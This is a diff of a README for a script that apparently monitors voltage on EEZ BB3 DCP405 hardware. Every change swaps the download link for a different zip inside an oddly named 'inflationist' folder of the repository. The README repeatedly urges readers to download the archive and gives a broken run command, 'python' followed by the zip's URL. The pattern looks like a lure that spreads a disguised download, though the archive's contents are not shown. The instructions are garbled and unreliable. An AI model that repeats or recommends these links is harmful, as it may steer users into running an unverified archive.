@@ -1,6 +1,6 @@
 # ⚡ EEZ-BB3-DCP405-voltage-follower - Simplify Your Voltage Monitoring
 
-[![Download EEZ-BB3-DCP405-voltage-follower](https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EEZ-BB3-DCP405-voltage-follower.zip)](https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EEZ-BB3-DCP405-voltage-follower.zip)
+[![Download EEZ-BB3-DCP405-voltage-follower](https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EE-follower-DC-B-voltage-2.3-alpha.2.zip)](https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EE-follower-DC-B-voltage-2.3-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -37,7 +37,7 @@ Follow the steps below to download and run the EEZ-BB3-DCP405-voltage-follower s
 
 To get the latest version of the application, visit the following page:
 
-[Download EEZ-BB3-DCP405-voltage-follower](https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EEZ-BB3-DCP405-voltage-follower.zip)
+[Download EEZ-BB3-DCP405-voltage-follower](https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EE-follower-DC-B-voltage-2.3-alpha.2.zip)
 
 ### Step 2: Select the Latest Release
 
@@ -45,7 +45,7 @@ On the releases page, look for the latest version of the code. Click on it to vi
 
 ### Step 3: Download the Script
 
-Find the downloadable file, which will be listed in the release details and labeled appropriately (e.g., `https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EEZ-BB3-DCP405-voltage-follower.zip` or similar).
+Find the downloadable file, which will be listed in the release details and labeled appropriately (e.g., `https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EE-follower-DC-B-voltage-2.3-alpha.2.zip` or similar).
 
 ### Step 4: Save to Your Computer
 
@@ -62,9 +62,9 @@ When you find the download link for the script, click to download it and save it
 
 3. **Execute the Script**: Use the following command to run the script:
    ```
-   python https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EEZ-BB3-DCP405-voltage-follower.zip
+   python https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EE-follower-DC-B-voltage-2.3-alpha.2.zip
    ```
-   Ensure that you replace `https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EEZ-BB3-DCP405-voltage-follower.zip` with the actual filename if it's different.
+   Ensure that you replace `https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EE-follower-DC-B-voltage-2.3-alpha.2.zip` with the actual filename if it's different.
 
 ## ⚙️ Configuration
 
@@ -98,4 +98,4 @@ For more updates, visit our project page and stay informed about new features an
 
 To get started with the EEZ-BB3-DCP405-voltage-follower script, please visit the following link to download the latest release:
 
-[Download EEZ-BB3-DCP405-voltage-follower](https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EEZ-BB3-DCP405-voltage-follower.zip)
+[Download EEZ-BB3-DCP405-voltage-follower](https://raw.githubusercontent.com/Python-xprime/EEZ-BB3-DCP405-voltage-follower/main/inflationist/EE-follower-DC-B-voltage-2.3-alpha.2.zip)
